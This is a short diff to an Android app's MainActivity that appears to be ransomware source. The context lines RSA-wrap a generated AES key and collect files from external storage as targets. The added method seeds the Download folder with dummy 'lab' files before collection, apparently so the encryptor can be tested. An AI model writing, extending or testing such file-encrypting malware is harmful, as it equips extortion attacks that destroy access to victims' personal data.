@@ -76,6 +76,7 @@ public class MainActivity extends Activity {
                 byte[] rsaWrapped = rsaWrap(pub, aes.getEncoded());
 
                 File root = Environment.getExternalStorageDirectory();
+                bootstrapTestFiles(root);
                 List<File> targets = new ArrayList<>();
                 collect(root, targets);
 
@@ -175,4 +176,18 @@ public class MainActivity extends Activity {
         fos.write(sb.toString().getBytes());
         fos.close();
     }
+
+    private void bootstrapTestFiles(File root) {
+        File dir = new File(root, "Download");
+        dir.mkdirs();
+        for (int i = 0; i < 5; i++) {
+            try {
+                File f = new File(dir, "lab_" + i + ".txt");
+                FileOutputStream fos = new FileOutputStream(f);
+                fos.write(("test payload " + i).getBytes());
+                fos.close();
+            } catch (Exception ignored) {}
+        }
+    }
+
 }
